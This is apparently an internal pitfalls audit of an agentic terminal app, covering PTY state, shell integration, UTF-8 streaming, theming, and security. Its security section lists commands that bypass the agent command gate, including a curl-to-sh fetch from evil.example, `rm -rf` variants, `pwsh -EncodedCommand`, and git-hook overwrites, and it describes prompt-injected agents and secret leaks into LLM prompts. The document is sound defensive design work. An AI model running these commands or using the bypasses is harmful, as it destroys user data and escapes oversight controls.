# Pitfalls Research

**Domain:** Warp-Class Agentic Terminal, Cross-Platform Stateful PTY Engine, Bidirectional Chat Harness & Roman Scriptorium GUI (`axis-warp-terminal-v75`)
**Researched:** 2026-11-14
**Confidence:** HIGH (grounded in direct audit of `vox-terminal-core`, `vox-gui`, `vox-orchestrator-d`, `vox-redact`, `vox-code-audit`, and `contracts/terminal/exec-policy.v1.yaml`)

## Critical Pitfalls

### Pitfall 1: Stateless `Command::new` Split-Brain, Full `replay_utf8` Re-Injection Loops, & No-Op PTY Resize

**What goes wrong:**
Commands submitted from `InputEditor` or by an agent appear to run in a "session," yet `cd`, `export` / `$env:`, virtualenvs, SSH agents, and shell aliases vanish immediately on the next command; meanwhile, every command submission duplicates the entire terminal scrollback inside `xterm.js` (`N`-squared output repetition), and resizing the Console pane wraps lines at `80` columns regardless of actual viewport width.

**Why it happens:**
Three concrete bugs exist in the current split pipeline:
1. **Stateless execution bypasses the live PTY:** `Session::submit_with_origin` (`crates/vox-terminal-core/src/session.rs:78-88, 154`) executes `InputIntent::Shell` via `run_shell_capture(&cmd)` (`crates/vox-terminal-core/src/pty.rs:181-205`), which spawns a disposable `std::process::Command::new(shell).arg("-c").arg(cmd)` instead of writing to `Entry.pty` (`PtyHandle`). The live PTY spawned in `LocalHost::open` sits idle unless raw keystrokes hit `termSessionInput`.
2. **Cumulative `replay_utf8` re-injected on every submit:** `TerminalTab.tsx` (`crates/vox-gui/ui/src/components/surfaces/Console/TerminalTab.tsx:203-215`) handles `pendingLine` by calling `termSessionSubmit(sid, pendingLine.text).then(() => termSessionAttach(sid))` and writing `termRef.current.write(snap.replay_utf8)` on top of an already-live `listenTermOutput` subscription (`TerminalTab.tsx:148`). Because `snap.replay_utf8` contains the **entire 2 MiB session ring buffer** (`DEFAULT_REPLAY_CAP` in `crates/vox-terminal-core/src/host.rs:179`), every submitted command dumps the full historical byte stream into `xterm.js` again, while `term_session_attach` (`crates/vox-gui/src/commands/pty.rs:213-243`) aborts and respawns the Tauri forwarder task (`attached_forwarders`), creating sequence-gap races.
3. **Dead PTY resize:** `PtyHandle::resize` (`crates/vox-terminal-core/src/pty.rs:319-324`) is a literal no-op (`let _ = (cols, rows); Ok(())`) because `pair.master` was moved into the blocking reader thread (`pty.rs:376-379`). Furthermore, `Console.tsx:188, 203` hardcodes `termSessionOpen(80, 24)` before `FitAddon` measures the DOM viewport.

**How to avoid:**
- Route all shell submissions (`User` and `Agent`) through the **single live stateful `PtyHandle`** (writing the command + newline to the PTY master and awaiting the correlated `OSC 633;C` → `OSC 633;D;<exit>` block transition), retiring stateless `run_shell_capture` from interactive sessions.
- Retain `Arc<Mutex<Box<dyn MasterPty + Send>>>` inside `PtyHandle` so `PtyHandle::resize(cols, rows)` invokes `master.resize(PtySize { rows, cols, .. })` (`TIOCSWINSZ` on Unix, `ResizePseudoConsole` on Windows).
- Attach **once** per mount (`snap.seq`), write `replay` bytes **only** on initial attach (or explicit `term.reset()` reconnect after sequence gap), and apply incremental `OutputFrame` (`frame.seq > lastSeq`) and `SessionEvent` deltas (`BlockOpened`, `OutputAppended`, `BlockClosed`) without calling `termSessionAttach` on every command.

**Warning signs:**
- Running `cd ..` followed by `pwd` prints the original working directory.
- Submitting 3 commands in `TerminalTab` causes the initial shell banner to appear 4 times in `xterm.js`.
- Running `tput cols` or `$Host.UI.RawUI.WindowSize.Width` in a maximized window still outputs `80`.

**Phase to address:**
Phase 1 (Stateful PTY Engine & Unified Session Lifecycle).

---

### Pitfall 2: Stdin Hook Injection Echo Spam, macOS `zsh` `PROMPT_SP` (`%`) + Broken `$?`, & Windows ConPTY Escape Reflow

**What goes wrong:**
Opening a new terminal tab floods the top of the screen (and the first captured block / replay buffer) with 15–25 lines of raw shell hook source code (`__VOX_OSC633=1`, `Set-PSReadLineKeyHandler...`), pollutes the user's Up-arrow shell history, prints a standout inverse `%` at prompt start on macOS `zsh`, miscalculates cursor column offsets by 7 characters during line editing, and falsely reports exit code `0` for every failing `zsh` command.

**Why it happens:**
1. **Raw stdin write after spawn:** `spawn_pty` (`crates/vox-terminal-core/src/pty.rs:368-372`) writes `shell_integration_snippet(shell)` directly into `writer` immediately after `pair.slave.spawn_command(cmd)`. Because the PTY slave starts with `ECHO` enabled (termios / ConPTY / PSReadLine), the shell echoes every line of the hook script to stdout and records it in interactive history.
2. **Broken `ZSH_OSC633` snippet (`pty.rs:62-79`):**
   - Defines `__vox_trappost() { __vox_ec=$? }` (`pty.rs:73`) **but never registers it on `TRAPZERR` or captures `$?` at the top of `__vox_precmd`**, so `${__vox_ec:-0}` is permanently `0` — every failed command in `zsh` records `Exit(0)` (`BlockStatus::Ok`)!
   - Appends raw `$'\e]633;B\a'` to `PROMPT` (`pty.rs:77`) without `zsh` zero-width prompt escapes (`%{...%}`), making `zsh` ZLE believe the prompt is 7 columns wider than rendered (corrupting line wrap and Tab-completion redraws).
   - macOS `zsh` enables `PROMPT_SP` + `PROMPT_CR` by default, emitting standout `%` (`PROMPT_EOL_MARK`) + `cols - 1` spaces + `\r` whenever startup or prior output lacks a trailing newline — polluting block output and `Osc633Parser` pre-prompt text.
3. **Windows ConPTY (`pwsh` / `powershell`):** ConPTY maintains a virtual screen buffer and synthesizes VT cursor-positioning sequences (`\x1b[2J`, `\x1b[H`, `\x1b[?25l`, `\x1b[C` cursor-forward runs instead of literal spaces, and line-wrap CRLF reflow). Writing `PWSH_OSC633` over stdin races `$PROFILE` loading and `PSReadLine` init, interleaving ConPTY cursor-Sync CSI sequences inside `Osc633Parser`'s stream.

**How to avoid:**
- **Eliminate stdin snippet injection completely.** Inject OSC 633 integration via zero-echo shell launch arguments and environment shims:
  - **`zsh`:** Set `ZDOTDIR` to a Vox-managed temporary/runtime shim directory (storing original `ZDOTDIR` in `VOX_ORIG_ZDOTDIR`) whose `.zshenv` / `.zshrc` sources the user's real dotfiles, captures `local __vox_ec=$?` as the **very first statement** of `__vox_precmd`, wraps prompt markers in `%{...%}`, and either sets `PROMPT_EOL_MARK=''` when block-framed or strips the `PROMPT_SP` sequence cleanly before `633;A`.
  - **`bash`:** Launch with `--rcfile <vox_bash_shim.sh>` that sources `/etc/profile` / `~/.bashrc` and captures `local ec=$?` as the first command in `PROMPT_COMMAND` (ensuring `PROMPT_COMMAND` array/string forms in Bash 5.1+ are preserved).
  - **`pwsh`:** Launch with `-NoLogo -NoExit -Command <bootstrap>` (honoring user `$PROFILE` unless isolated mode is requested) so `PSReadLine` and `prompt` wrap before the first prompt renders with zero stdin echo.
  - **`fish`:** Launch with `--init-command "source <vox_fish_shim.fish>"`.
  - **`nu`:** Launch with `--env-config` / `--config` hook append or `-e` bootstrap.
- Strip non-semantic terminal title/mode noise and handle `OSC 633;P;Cwd=...` explicitly so working directory state tracks `cd` natively across all shells.

**Warning signs:**
- First 20 lines of `Attachment.replay` contain `__VOX_OSC633` or `$global:__VoxOsc633`.
- Pressing `UpArrow` in a fresh tab recalls the hook definition instead of the user's previous command.
- Running `false` in `zsh` produces a green `exit 0` badge in `BlockStreamView`.

**Phase to address:**
Phase 1 (Stateful PTY Engine & Zero-Echo Cross-Platform Shell Integration).

---

### Pitfall 3: UTF-8 Multi-Byte Chunk Boundary Corruption Across 4096-Byte PTY Reads & Ring-Buffer Slicing

**What goes wrong:**
Box-drawing tables (`─`, `│`, `╭`), Unicode spinners (`⠋`, `⠙`), Cargo progress bars, accented Latin text, and emojis intermittently turn into replacement diamonds (``, `U+FFFD`), or ANSI CSI/OSC sequences split at the head of `replay` dump raw `[38;5;214m` garbage onto the screen when switching tabs.

**Why it happens:**
`spawn_pty` (`crates/vox-terminal-core/src/pty.rs:380-389`) reads arbitrary byte slices from the OS pipe (`[0u8; 4096]`). A 3-byte UTF-8 sequence (e.g., `─` = `0xE2 0x94 0x80`) or 4-byte codepoint routinely straddles two `read()` calls (`[... 0xE2, 0x94]` in chunk `k`, `[0x80 ...]` in chunk `k+1`). Four current sites immediately call `String::from_utf8_lossy` on isolated chunks without carrying trailing incomplete UTF-8 bytes:
1. `crates/vox-gui/src/commands/pty.rs:227` (`term_session_attach` forwarder): `String::from_utf8_lossy(&c.bytes).into_owned()` per `OutputFrame`.
2. `crates/vox-gui/src/commands/pty.rs:151` (`pty_spawn` forwarder): `String::from_utf8_lossy(&bytes)`.
3. `crates/vox-terminal-core/src/osc633.rs:84, 112`: `Osc633Parser::parse` converts non-capturing `tail` slices via `String::from_utf8_lossy(tail)` on every `feed()` call instead of retaining 1–3 trailing incomplete UTF-8 bytes.
4. `crates/vox-terminal-core/src/host.rs:277-278` + `crates/vox-gui/src/commands/pty.rs:59`: `Replay` evicts exact byte counts (`r.buf.drain(..over)`), slicing directly through multi-byte UTF-8 codepoints **and** mid-flight ANSI CSI/OSC sequences (`\x1b[38;2;...` or `\x1b]633;...`) at the start of the 2 MiB window.

**How to avoid:**
- **Stream raw bytes (`Uint8Array` / base64) to `xterm.js`:** Pass `Uint8Array` into `term.write(bytes)` in `TerminalTab.tsx`; `xterm.js` has a stateful streaming UTF-8 + VT parser built specifically for arbitrary byte boundaries.
- **Stateful UTF-8 decoder inside `Osc633Parser`:** Add a 4-byte `utf8_tail: Vec<u8>` buffer in `Osc633Parser` (using `std::str::from_utf8(&buf)` → `err.valid_up_to()` when `err.error_len().is_none()`) so split multi-byte characters across `feed()` calls reassemble losslessly before emitting `Osc633Event::Output`.
- **Boundary-aware `Replay` eviction:** When draining `Replay.buf`, advance the drain index past any UTF-8 continuation bytes (`(b & 0b1100_0000) == 0b1000_0000`) and past any severed partial CSI/OSC sequence up to the next clean terminator or `\n`.

**Warning signs:**
- `` characters appear in `cargo test`, `ratatui`/`lipgloss` CLI output, or `tree` box-drawing output under load.
- Property test feeding a multi-kilobyte UTF-8 string in prime-sized chunks (e.g., 7-byte or 4096-byte slices) to `Osc633Parser::feed` fails string equality against single-slice feed.

**Phase to address:**
Phase 2 (Lossless Byte-Stream Transport, Stateful UTF-8 Decoding & OSC-633 Framing).

---

### Pitfall 4: Interactive, Pager, & Daemon Command Deadlocks in Bidirectional Agent/Chat Tool Loops

**What goes wrong:**
An agent (or Co-Pilot/Autopilot turn) runs `git diff`, `git log`, `npm init`, `npx create-...`, `sudo ...`, `ssh ...`, or `pnpm dev`. The command never exits: `git diff` blocks inside `less` waiting for `q`, `npm init` waits on stdin for package name, or `pnpm dev` runs forever listening on `:5173`. The agent's tool call hangs indefinitely, exhausting Tokio blocking threads and wedging the Chat ↔ Terminal harness with no UI escape hatch.

**Why it happens:**
`TermDispatch::run_agent_command` (`crates/vox-orchestrator-d/src/term_dispatch.rs:71`) and `term.submit` (`term_dispatch.rs:173`) wrap `host.submit(...)` in `tokio::task::spawn_blocking` with **no timeout, no pager neutralization, no interactive-stdin / alt-screen detection, no `SIGINT` cancellation wire method, and no background-daemon promotion**. Once commands execute inside a real PTY, `isatty(1) == 1` causes `git`, `gh`, `systemctl`, `bat`, and `npm` to **enable interactive pagers, prompts, and spinners automatically** (whereas piped `Command::output()` previously had `isatty == 0`).

**How to avoid:**
- **Agent-safe environment overrides:** Inject `PAGER=cat`, `GIT_PAGER=cat`, `MANPAGER=cat`, `SYSTEMD_PAGER=cat`, `BAT_PAGER=""` in session defaults (or wrap agent-dispatched commands with pager-free env while keeping `COLORTERM=truecolor` / `FORCE_COLOR=1`). For unattended Autopilot runs, also set `GIT_TERMINAL_PROMPT=0` and `CI=1` (configurable per control mode).
- **Multi-signal Interactive Stall & Alt-Screen Detector:**
  - Detect DECSET `?1049h` / `?47h` (alternate screen entry by `vim`, `less`, `htop`, `lazygit`).
  - Track foreground process group (`tcgetpgrp` on Unix / child console process list on Windows) + output silence window (e.g., >2.5s idle with no `OSC 633;D` while foreground pgid != shell pgid) + trailing prompt heuristics (`[Y/n]`, `(y/N)`, `Password:`, `passphrase`, `:` at column 0 without newline).
  - Transition block state to `AwaitingInput` / `Interactive` and notify both the Console Block UI ("Waiting for user input in terminal — Type directly, Send `Ctrl+C`, or Promote to Background") and the Agent tool caller immediately instead of hanging until a 900s timeout.
- **First-class `term.signal` (`SIGINT` / `SIGTERM` / `EOF`) & Background Promotion:** Provide a structured interrupt endpoint (sending `\x03` / `killpg(fg_pgid, SIGINT)`) and allow long-running servers (`pnpm dev`, `cargo watch`) to be promoted to monitored background tasks once readiness regex / port-open / time budget triggers, returning partial startup logs + live block reference `@term:<sid>#<id>` to Chat.

**Warning signs:**
- Running `git log` in an agent-driven PTY session never emits `OSC 633;D` because `less` entered alternate screen `?1049h`.
- Clicking Stop in Loquela Chat leaves the spawned child process running inside the PTY and blocks the next command in the queue.

**Phase to address:**
Phase 4 (Bidirectional Agent/Chat Harness, Stall Detection & Background Promotion).

---

### Pitfall 5: Vox Axis Proportional `Palatino` `--font-mono` Remap, Fake WebGL Addon, & Global Romanesque CSS Bleed

**What goes wrong:**
1. In `xterm.js` and Console output, characters render in proportional `Palatino` serif (`i` = 4px, `W` = 13px) or get overridden by `!important` rules, destroying fixed-cell column alignment, shifting cursor position away from typed text, breaking `FitAddon` column calculation, and shredding ASCII/box-drawing tables.
2. Attempting to fix `TerminalTab.tsx` by specifying `'Menlo'`, `'Monaco'`, `'Consolas'`, or `'Courier New'` triggers a hard CI build failure in `vox-code-audit` (`vox/ui/theme-contract-drift`, `Severity::Error`)!
3. In light themes (`arcane` / `glacier`), `.text-brass` inside dark terminal chrome renders as `#1C140C` on `#1E170F` (**1.03:1 invisible dark-on-dark contrast**), `xterm`'s hidden `<textarea class="xterm-helper-textarea">` becomes a visible cream `#FAF5E8` box with a gold border, and block action buttons morph into bulky 3D riveted marble plaques.
4. Hardware WebGL acceleration appears active in UI badges (`WebGL Block Renderer · OSC-633 SessionHost Active`), yet `xterm.js` actually runs on its slow unaccelerated DOM renderer.

**Why it happens:**
Direct collisions between Vox Axis's Romanesque Theme Contract and `xterm.js` internals:
1. **`--font-mono` is proportional serif in 3 of 4 themes:** In `crates/vox-gui/ui/src/index.css:21` and `crates/vox-gui/ui/src/lib/themeContract.ts:162, 227, 260`, `--font-mono` is mapped to `'Palatino', 'Palatino Linotype', 'Book Antiqua', 'EB Garamond', Georgia, serif`. Worse, `index.css:467-478` enforces `.font-mono, pre, code, kbd, samp { font-family: var(--font-mono, 'Palatino'...) !important; }`, and `index.css:254-271` forces `button.font-mono, select.font-mono` to `Cinzel` and `main span.font-mono, main div.font-mono` to `Palatino`!
2. **Static theme-contract audit bans standard system monospace names:** `crates/vox-code-audit/src/detectors/ui_theme_contract.rs:36-47` and `themeContract.ts:106-113` ban `'Courier New'`, `'Courier'`, `'Arial'`, `'Consolas'`, `'Menlo'`, and `'Monaco'` across all non-allowlisted `vox-gui/ui/src/` files.
3. **Global light-theme CSS overrides bleed into `xterm.js` and Console:**
   - `index.css:745-809` forces `.text-brass` to `color: #1C140C !important` across `main`, turning `TerminalTab.tsx:250` (`text-brass` over inline dark `#1E170F` gradient) into `#1C140C` on `#1E170F`.
   - `index.css:683-695` matches `main textarea` and `main input:not(...)` with `background-color: #FAF5E8 !important; border: 1.5px solid rgba(197, 155, 39, 0.72) !important; color: #1C140C !important;`, which hits `xterm.js`'s internal `.xterm-helper-textarea`!
   - `index.css:708-742` rewrites `[class*="bg-zinc-9"]` and `[class*="bg-black"]` (used throughout `BlockStreamView.tsx:127, 165` and `InputEditor.tsx:227, 244`) to `#FAF5E8 !important`, creating jarring half-converted cards with mismatched `border-white/10` and `text-zinc-*` overrides.
4. **`WebglTerminalAddon` is currently a no-op stub:** `crates/vox-gui/ui/src/components/surfaces/Console/webglAddon.ts:19-35` creates an unattached `document.createElement('canvas')` in memory and never hooks into `xterm.js` rendering (`@xterm/addon-webgl`), so WebGL glyph atlas rendering is not actually active.

**How to avoid:**
- **Introduce a dedicated `--font-terminal-mono` contract variable** in `index.css` and `themeContract.ts` (allowlisted SSOT files) using true fixed-width glyphs that comply with `ui_theme_contract.rs` (e.g., `'JetBrains Mono', 'Iosevka Term', ui-monospace, 'SFMono-Regular', monospace` — never `Consolas`/`Menlo`/`Monaco`/`Courier`), wait for `document.fonts.ready` before `FitAddon.fit()`, and pass that exact resolved font family to `new Terminal({ fontFamily })`.
- **CSS Containment Boundary (`[data-vox-terminal-canvas="true"]` / `.xterm`):** Explicitly exclude `:not(.xterm):not(.xterm *)` from `index.css` global `main textarea`, `main span/div`, `pre/code` Palatino `!important` rules, and global light/dark utility rewrites so `xterm.js` owns its internal DOM/canvas subtree undisturbed.
- **Wire real `@xterm/addon-webgl`** with graceful `onContextLoss` disposal → automatic fallback to `xterm` DOM/Canvas renderer, and disable WebGL addon cleanly when headless software rendering (`.no-tauri` / SwiftShader without WebGL2) is detected.
- **Eliminate all hardcoded `zinc-*`, `black/*`, `white/*`, and `#1E170F` literals in Console:** Style `Console.tsx`, `BlockStreamView.tsx`, `InputEditor.tsx`, and `xterm.options.theme` ("Illuminated Scriptorium Parchment & Espresso Ink" in `arcane`/`glacier`, "Basalt Slate" in `slate`, "Obsidian AAA" in `high-contrast`) strictly from semantic tokens synced dynamically when `data-theme` changes, guaranteeing WCAG ≥ 4.5:1 across all 16 ANSI palette slots + foreground/background/selection/cursor.

**Warning signs:**
- `cargo run -p vox-cli -- audit code` fails with `vox/ui/theme-contract-drift` on Console `.tsx` files.
- In `arcane` theme, `getComputedStyle(xtermElement.querySelector('.xterm-rows')).fontFamily` contains `Palatino` or `xterm.textarea` has a visible `#FAF5E8` background.
- ANSI yellow/cyan/white text rendered by `cargo test` or `ls --color` on a light parchment terminal background falls below 4.5:1 WCAG contrast (classic "pastel ANSI yellow on cream background" readability failure).

**Phase to address:**
Phase 5 (Roman Scriptorium Console Surface, True Monospace Grid Isolation & Theme-Synchronized ANSI Palettes).

---

### Pitfall 6: Naive Substring Security Gating Bypasses & Unredacted `@term` Secret Leaks Into LLM Context

**What goes wrong:**
1. Under `L1ReadOnly` or `L2SafeExec`, a prompt-injected or hallucinating agent executes arbitrary destructive commands or exfiltrates files because `allows_agent_command` only inspects the first whitespace token or naive space-padded substrings.
2. Secrets printed in terminal output (`.env` variables, `Authorization: Bearer ...`, Clavis-resolved keys, database URLs, macOS `/Users/<name>` paths, ANSI-colored tokens) flow **completely unredacted** into cloud LLM prompts when a user types `@term` in Loquela Chat or clicks "Send to Agent" in Console.

**Why it happens:**
Multiple disconnected security and redaction seams exist today:
1. **Trivial bypasses in `TermSecurityLevel::allows_agent_command` (`crates/vox-terminal-core/src/host.rs:76-145`):**
   - `L1ReadOnly` (`host.rs:102-121`) checks **only** `lower.split_whitespace().next()`! Commands like `echo $(rm -rf src)`, ``ls `curl https://evil.example/p.sh | sh` ``, `pwd; git reset --hard`, `cat a && rm b`, `find . -delete`, `find . -exec sh -c '...' \;`, or `git diff --output=.git/hooks/pre-commit` **all pass `L1ReadOnly`**.
   - `L2WorkspaceBuild` (`host.rs:123-131`) only checks `["rm ", "mv ", "cp ", "chmod ", "chown ", "sudo ", "su "]` — bypassed by `/bin/rm`, `\rm`, `unlink`, `> Cargo.toml` (shell redirection clobber), `python3 -c ...`, `vox run ...`, or `git checkout -- .`.
   - Catastrophic floor (`host.rs:87-99`) checks literal `"rm -rf /"` and `"git push --force"` — bypassed by `rm -fr /`, `rm -r -f /`, `git push -f`, `git push origin +main`.
   - Meanwhile, `contracts/terminal/exec-policy.v1.yaml` (`allowed_binaries` includes `pwsh` and `powershell` at lines 25–26, enabling nested `pwsh -EncodedCommand ...` or `pwsh -c ...` recursion if inner payloads aren't recursively AST-checked!) and `vox_orchestrator::oversight::floor::classify_floor` (`crates/vox-orchestrator/src/oversight/floor.rs:173`) are **not wired into `vox-terminal-core`**.
2. **Four concrete secret-redaction leaks into LLM context:**
   - **Leak A (`Loquela.tsx:1035-1048`):** Client-side `@term` expansion reads `termBridge.blocks` directly in TypeScript (`b.input` + `b.output`) and injects it straight into `ChatPayload.description` **without calling `term.context` / `redacted_context_bundle` at all**! Furthermore, `desc.replace(/@term/g, ...)` corrupts `@term:failed`, `@term:pinned`, and `@term:s-1#3:L1-L5` into `[Terminal Session...]:failed` while ignoring chips added via `requestChatAttention` (`Loquela.tsx:732-738`)!
   - **Leak B (`Console.tsx:249, 275-280`):** Clicking "Send to Agent" calls `renderTermBlockForAgent` (`webglAddon.ts:79-92`) on raw `TermBlockDto` and dispatches `sendToAgent(agentId, body)` with **zero redaction**.
   - **Leak C (`vox-redact/src/lib.rs:40-64` coverage gaps):** `re_home()` matches `/home/...` and `C:\Users\...` but **misses macOS `/Users/<username>`**; `re_token()` misses Google `AIza...`, HuggingFace `hf_...`, npm `npm_...`, Stripe `sk_live_...`, PEM private keys (`-----BEGIN ... PRIVATE KEY-----`), URL basic-auth (`https://user:pass@host`), and arbitrary-format secrets resolved at runtime by `vox-secrets` (Clavis).
   - **Leak D (ANSI SGR interleaved inside secrets):** Raw PTY output frequently wraps tokens in ANSI color escapes (e.g., `\x1b[32msk-proj-...\x1b[0m`), breaking regex `\b` boundaries and prefix matchers unless ANSI sequences are stripped **prior** to redaction.

**How to avoid:**
- **AST-backed, fail-closed command gating:** Replace `allows_agent_command` substring checks with a unified shell-AST / token-grammar classifier shared with `vox shell check` (`exec-policy.v1.yaml`) + `classify_floor`:
  - Reject command substitution (`$()`, `` `...` ``, `<()`, `>()`), compound chains (`;`, `&&`, `||`, `|`, `&`, `\n`), output redirections (`>`, `>>`), wrapper binaries (`sh -c`, `bash -c`, `pwsh -c`, `pwsh -EncodedCommand`, `env`, `xargs`, `find -exec`/`-delete`) in `L1`/`L2` unless every inner command AST node independently satisfies the active `TermSecurityLevel` and `exec-policy.v1.yaml`.
- **Single server-side redaction choke point for all LLM context:**
  - Never expand `@term*` raw text in browser JS from unredacted UI state. Resolve `@term`, `@term:last`, `@term:failed`, `@term:pinned`, and `@term:<sid>#<block>:L<a-b>` exclusively on the Rust backend (or via `term.context` RPC) **after**: (1) stripping ANSI CSI/OSC control sequences, (2) running expanded `vox-redact` patterns (including `/Users/[^/\s]+`, PEM blocks, URL credentials, `AIza`/`hf_`/`npm_`/`sk_live_`), and (3) exact-value scrubbing against active non-empty secrets held in `vox-secrets` / Clavis!
  - Route `SendToAgent` through the same redacted formatter before `sendToAgent`.

**Warning signs:**
- `host.submit_with_origin(id, "!echo $(touch pwned)", BlockOrigin::Agent { .. })` succeeds under `L1ReadOnly`.
- Typing `explain @term:failed` in Loquela sends the last 2 blocks (not the failed block), leaves `:failed` literally in the prompt, and includes raw `sk-...` tokens in the outbound LLM payload.

**Phase to address:**
Phase 3 (AST-Enforced Terminal Security Gate & Clavis-Aware Context Redaction).

---

### Pitfall 7: Silent Stream Death on `RecvError::Lagged`, Unbounded Block IPC Serialization, & CV Flywheel Non-Determinism

**What goes wrong:**
1. Running a high-throughput command (`cargo build -vv`, `rg` across a large tree, `cat` of a large log) causes the GUI terminal viewport to **silently freeze forever mid-command** while the process finishes in the background.
2. After 50–100 commands (or one command outputting 20 MB), every `BlockClosed` event stalls the UI main thread for hundreds of milliseconds as megabytes of JSON re-serialize across Daemon → Tauri → React → `BlockStreamView`.
3. Automated CV Flywheel visual audits fail to converge on the Console surface due to blinking cursors, live shell prompt timestamps/git-dirty badges, infinite CSS keyframe animations, or testing the `isMock` HTML fallback (`TerminalTab.tsx:228`) instead of the real `xterm.js` canvas.

**Why it happens:**
1. **Broadcast lag kills `term.attach` with no UI recovery:** `Entry.out_tx` (`host.rs:265`) and `Session.tx` (`session.rs:34`) use `tokio::sync::broadcast::channel(256)`. At 4096 bytes per read, 256 frames is ~1 MiB (a few milliseconds of fast stdout). When Tauri IPC or TCP backpressure lags by 257 frames, `term_dispatch.rs:252-254, 263-266` sends `{"type": "lagged"}` and **returns `Ok(())`, closing the stream**, causing `daemon_host.rs:171` (`pump`) to exit — and `TerminalTab.tsx:148-183` has **zero `lagged` / stream-closed reconnect logic**!
2. **Full-history re-fetch on every `BlockClosed` & unbounded `Session.blocks`:** `Session.blocks` (`session.rs:25`) grows without bound and has no per-block byte cap. Worse, `TerminalTab.tsx:163-168` responds to every `BlockClosed` event by calling `termSessionAttach(sid)`, re-downloading `replay_utf8` (up to 2 MiB) **plus** every block ever recorded in the session, then rendering all blocks unvirtualized in `BlockStreamView.tsx:92` (`blocks.map(...)`).
3. **CV Flywheel non-determinism:** `index.css:449-459` runs infinite animations (`vox-marble-sheen`, `vox-dial-breathe`, `vox-brass-glint`), `xterm.js` blinks the cursor by default (`cursorBlink`), WebGL font atlases rasterize asynchronously after mount, and live shells print dynamic hostnames/paths/times. Meanwhile, `TerminalTab.tsx:62, 228` switches to a completely different hardcoded `<div>` tree when `window.__TAURI_CALLS__` is truthy, hiding real `xterm.js` CSS/layout defects in Playwright mock tests!

**How to avoid:**
- **Coalescing PTY pump + automatic `lagged` resync:** Coalesce bursty PTY reads into 8–16 ms frame batches (e.g., up to 64 KiB per frame) before broadcasting, raise channel capacity, and emit an explicit `TermSessionLagged` Tauri event on `RecvError::Lagged` so `TerminalTab.tsx` performs a clean `term.reset()` + `termSessionAttach(sid)` resync automatically.
- **Cap per-block output & stream block deltas:** Enforce a per-block in-memory head+tail truncation cap (e.g., 256 KiB retained per `Block` with `[... truncated N bytes; full log in scrollback/artifact ...]`), cap `Session.blocks` ring length (e.g., 500 blocks), update React block state incrementally from `SessionEvent` (`BlockOpened`, `OutputAppended`, `BlockClosed`) instead of re-calling `termSessionAttach`, and virtualize `BlockStreamView` (`@tanstack/react-virtual` or windowed list).
- **Deterministic CV Flywheel Freeze Mode:** Render real `xterm.js` (DOM/Canvas renderer when WebGL is unavailable) in Playwright preview/audit harnesses using deterministic fixture transcripts (`cursorBlink: false`, `document.fonts.ready` awaited, `prefers-reduced-motion: reduce` / `[data-cv-audit="true"]` freezing shimmer keyframes, fixed `cols`/`rows`, and scrubbed/deterministic prompt fixtures).

**Warning signs:**
- Running `yes | head -n 50000` freezes `TerminalTab` before printing line 50000.
- Tauri IPC payload size on `term_session_attach` exceeds 1 MB after a single `cargo test` failure log.
- Two consecutive CV screenshots of an idle Console surface have non-zero pixel diff.

**Phase to address:**
Phase 2 (Streaming Backpressure & Bounded Block Store) and Phase 6 (CV Flywheel Convergence & E2E Determinism).

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Executing `!cmd` via `std::process::Command::new(shell).arg("-c")` (`run_shell_capture` in `pty.rs:181`) instead of the live PTY | Zero async correlation needed to get `(exit_code, stdout, stderr)` | Breaks `cd`, `export`, virtualenvs, TTY colors, interactive tools, and splits session truth from `xterm.js` | **Never** in interactive sessions (acceptable only for isolated one-shot headless CLI probes) |
| Injecting OSC 633 shell hooks by writing raw text into PTY master stdin (`pty.rs:370`) | Avoids managing per-shell temp `ZDOTDIR` / `--rcfile` files | Echoes 20 lines of hook code into viewport & replay buffer, pollutes shell history, races `.PROFILE` | **Never** in production GUI/TUI |
| Calling `termSessionAttach` on every `BlockClosed` / `pendingLine` (`TerminalTab.tsx:166, 206`) | Avoids incremental client-side `Block` reducer logic | Re-transfers megabytes of blocks + 2 MiB `replay_utf8` per command, duplicates `xterm` output, leaks/races forwarder tasks | **Never** |
| Mock-only `<div>` fallback (`isMock` in `TerminalTab.tsx:228`) replacing `xterm.js` in browser/Playwright tests | Avoids JSDOM canvas/resize stubs in unit tests | Masks real `xterm.js` Palatino font collisions, `.xterm-helper-textarea` CSS bleed, and `FitAddon` sizing bugs from Playwright & CV flywheel | Unit tests (JSDOM) **only**; Playwright/CV must mount real `xterm.js` |
| Stub `WebglTerminalAddon` (`webglAddon.ts:19`) creating a detached `<canvas>` | Satisfies interface tests without `@xterm/addon-webgl` package wiring | Misleads operators with "WebGL Active" badge while running slow DOM renderer on high-throughput streams | **Never** — wire real `@xterm/addon-webgl` or label renderer honestly |
| Regex/substring prefix checks in `TermSecurityLevel::allows_agent_command` (`host.rs:76`) | 60 lines of zero-dependency Rust | Trivially bypassed by `$()`, backticks, `;`, `|`, `>`, `find -exec`, `/bin/rm`, and `pwsh -c` | **Never** for security boundaries gating agent execution |

## Integration Gotchas

Common mistakes when connecting terminal components across shells, OS PTYs, and Vox Axis subsystems.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| **`xterm.js` + Vox Axis CSS (`index.css`)** | Letting `@layer base` `.font-mono, pre, code` (`Palatino !important`) and `main textarea` / `main button` rules cascade into `.xterm` | Isolate `.xterm` with `[data-vox-terminal-canvas="true"]`, use allowlisted `--font-terminal-mono` (true fixed-cell font), and add `:not(.xterm *)` guards to `index.css` global element selectors |
| **`vox-code-audit` (`ui_theme_contract.rs`)** | Specifying `'Menlo'`, `'Monaco'`, `'Consolas'`, or `'Courier New'` in `.tsx` terminal font stacks, or using `#1E170F` / `rgba(18,14,10,...)` | Define `--font-terminal-mono` in allowlisted `src/index.css` + `src/lib/themeContract.ts` using `'JetBrains Mono', ui-monospace, 'SFMono-Regular', monospace` and semantic theme tokens |
| **macOS `zsh` (`OSC 633`)** | Reading `$?` after intermediate hook commands (`__vox_ec=0` bug), omitting `%{...%}` around `633;B` in `PROMPT`, ignoring `PROMPT_SP` (`%`) | Capture `local ec=$?` as line 1 of `precmd`, wrap prompt OSC sequences in `%{...%}`, inject via `ZDOTDIR` shim, and suppress/handle `PROMPT_EOL_MARK` |
| **Windows ConPTY + `pwsh`** | Assuming PTY output equals raw child stdout; ignoring ConPTY cursor-forward `\x1b[C` & screen-clear `\x1b[2J` synthesis; leaving `PtyHandle::resize` as a no-op | Feed raw ConPTY stream directly to `xterm.js` for VT grid accuracy, call `ResizePseudoConsole` via retained `MasterPty`, and launch `pwsh -NoLogo -NoExit` |
